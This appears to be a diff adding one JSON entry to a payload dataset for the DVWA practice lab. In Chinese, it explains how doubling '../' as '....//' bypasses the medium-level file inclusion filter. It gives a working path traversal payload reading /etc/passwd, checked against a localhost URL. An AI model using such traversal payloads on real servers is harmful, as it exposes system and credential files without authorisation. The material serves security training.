@@ -1,0 +1,10 @@
+[
+  {
+    "id": "auto-20261030125726",
+    "context": "DVWA medium File Inclusion。page 参数过滤 `../` 和 `http://` `https://`（黑名单替换），但用 `....//` 双写绕过：服务端把 `....//` 里的 `../` 删掉后剩下 `../`，仍在 include 路径中生效。fi 目录深度为 /var/www/html/vulnerabilities/fi/，需 5 层 ../ 到 /。",
+    "reference_payload": "....//....//....//....//....//etc/passwd",
+    "principle": "../ 黑名单过滤用 ....// 双写绕过（删除一层 ../ 后残留 ../）；include 路径穿越读本地文件",
+    "source": "dvwa",
+    "verify_url": "http://localhost:8081/vulnerabilities/fi/?page={payload}"
+  }
+]
